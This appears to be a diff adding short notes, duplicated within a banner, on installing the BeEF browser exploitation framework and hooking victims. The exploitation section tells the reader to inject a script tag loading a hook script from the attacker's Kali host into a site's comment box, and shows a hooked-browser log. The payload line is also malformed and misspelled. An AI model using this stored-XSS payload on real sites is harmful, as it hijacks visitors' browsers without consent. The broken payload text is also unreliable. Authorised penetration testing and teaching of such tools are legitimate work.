@@ -1,0 +1,90 @@
+BeEF is short for The Browser Exploitation Framework. It is a penetration testing tool 
+that focuses on the web browser.
+
+Amid growing concerns about web-borne attacks against clients, including mobile clients, 
+BeEF allows the professional penetration tester to assess the actual security posture of 
+a target environment by using client-side attack vectors. Unlike other security 
+frameworks, BeEF looks past the hardened network perimeter and client system, and 
+examines exploitability within the context of the one open door: the web browser. 
+BeEF will hook one or more web browsers and use them as beachheads for launching 
+directed command modules and further attacks against the system from within the browser 
+context.
+
+-> Installation
+  Go to https://www.ruby-lang.org/fr/news/2022/02/18/ruby-3-1-1-released/ and retreive 
+    the Ruby 3.1.1 tar.gz file.
+  Extract it (that creates ruby-3.1.1 directory).
+  Compile and install Ruby:
+    $ cd ruby-3.1.1
+    $ ./configure
+    $ make
+    $ sudo make install
+  Go to https://github.com/beefproject/beef.
+  Clone the repository:
+    $ git clone https://github.com/beefproject/beef.git
+  Go to into the directory (now beef).
+  $ sudo ./install
+  Change the password into the config.yaml file.
+
+-> Exploitation
+  Start beef:
+    $ cd ~/Document/beef
+    $ ./beef
+  In Kali, open the BeEF UI URL: UI URL:   http://127.0.0.1:3000/ui/panel  
+  Copy the UI URL link: http://<kali ip>:3000/ui/panel
+  Add this line into the attacked browser (in a comment box): <script src="http<kali ip>:3000/hock.js></script>
+  You should see a new hooked browser: 
+    [ 2:46:19][*] New Hooked Browser [id:1, ip:<hooked ip>, browser:FF-47, os:Windows-10], hooked origin [127.0.0.1:80]
+  Look at Looked Browsers and click on the newly hooked machine.
+  Click on the Current Browser folder and discover the World !
+  Here, you will find new Folder, like Details or Commands.
+
+>@
+>@#############################################################################################
+>@#                                                                                           #
+>@# [ BeEF | The Browser Exploitation Framework                                               #
+>@# BeEF is short for The Browser Exploitation Framework. It is a penetration testing tool    #
+>@# that focuses on the web browser.                                                          #
+>@#                                                                                           #
+>@# Amid growing concerns about web-borne attacks against clients, including mobile clients,  #
+>@# BeEF allows the professional penetration tester to assess the actual security posture of  #
+>@# a target environment by using client-side attack vectors. Unlike other security           #
+>@# frameworks, BeEF looks past the hardened network perimeter and client system, and         #
+>@# examines exploitability within the context of the one open door: the web browser.         #
+>@# BeEF will hook one or more web browsers and use them as beachheads for launching          #
+>@# directed command modules and further attacks against the system from within the browser   #
+>@# context.                                                                                  #
+>@#                                                                                           #
+>@#-------------------------------------------------------------------------------------------#
+>@
+>@-> Installation
+>@  Go to https://www.ruby-lang.org/fr/news/2022/02/18/ruby-3-1-1-released/ and retreive 
+>@    the Ruby 3.1.1 tar.gz file.
+>@  Extract it (that creates ruby-3.1.1 directory).
+>@  Compile and install Ruby:
+>@    $ cd ruby-3.1.1
+>@    $ ./configure
+>@    $ make
+>@    $ sudo make install
+>@  Go to https://github.com/beefproject/beef.
+>@  Clone the repository:
+>@    $ git clone https://github.com/beefproject/beef.git
+>@  Go to into the directory (now beef).
+>@  $ sudo ./install
+>@  Change the password into the config.yaml file.
+>@
+>@-> Exploitation
+>@  Start beef:
+>@    $ cd ~/Document/beef
+>@    $ ./beef
+>@  In Kali, open the BeEF UI URL: UI URL:   http://127.0.0.1:3000/ui/panel  
+>@  Copy the UI URL link: http://<kali ip>:3000/ui/panel
+>@  Add this line into the attacked browser (in a comment box): <script src="http<kali ip>:3000/hock.js></script>
+>@  You should see a new hooked browser: 
+>@    [ 2:46:19][*] New Hooked Browser [id:1, ip:<hooked ip>, browser:FF-47, os:Windows-10], hooked origin [127.0.0.1:80]
+>@  Look at Looked Browsers and click on the newly hooked machine.
+>@  Click on the Current Browser folder and discover the World !
+>@  Here, you will find new Folder, like Details or Commands.
+>@
+>@#############################################################################################
+>@
